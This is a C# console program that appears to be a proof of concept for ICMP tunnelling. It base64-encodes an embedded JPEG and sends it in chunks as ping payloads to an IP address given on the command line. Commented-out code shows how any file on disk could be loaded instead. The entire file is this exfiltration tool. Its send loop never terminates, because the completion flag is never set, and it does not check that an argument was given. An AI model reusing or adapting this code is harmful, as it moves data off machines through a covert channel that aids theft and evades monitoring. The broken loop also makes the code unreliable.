using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Net.NetworkInformation;
using System.IO;
//using System.Drawing;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            if (string.IsNullOrEmpty(args[0]))
            {
                Console.WriteLine("You need to provide an ip address as the first argument!!");
            }
            else
            {
                Console.WriteLine("Sending payload to: " + args[0]);
                Execute(args[0]);
            }
        }

        public static string GetImage()
        {
            string base64String = "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";
 //           using (Image image = Image.FromFile(path))
 //           {
 //               using (MemoryStream m = new MemoryStream())
 //               {
 //                   image.Save(m, image.RawFormat);
 //                   byte[] imageBytes = m.ToArray();
 //                   base64String = Convert.ToBase64String(imageBytes);
 //               }
 //           }
            return base64String;

        }
        public static void Execute(string ipaddress)
        {
            string imageArray = GetImage();
            Ping pingSender = new Ping();
            PingOptions pingOptions = new PingOptions();

            pingOptions.DontFragment = true;

            byte[] buffer = Encoding.ASCII.GetBytes(imageArray);
            int bufferSize = buffer.Count<byte>();
            int index = 0;
            bool done = false;
            while (!done)
            {
                int offset = 1024;

                if ((index + offset) > bufferSize)
                {
                    offset = bufferSize - index;
                }
                byte[] tmpBuffer = new byte[offset];

                Buffer.BlockCopy(buffer, index, tmpBuffer, 0, offset);
                index = index + offset;

                PingReply reply = pingSender.Send(IPAddress.Parse(ipaddress), 120, tmpBuffer, pingOptions);
                reply.ToString();
            }
        }
    }
}
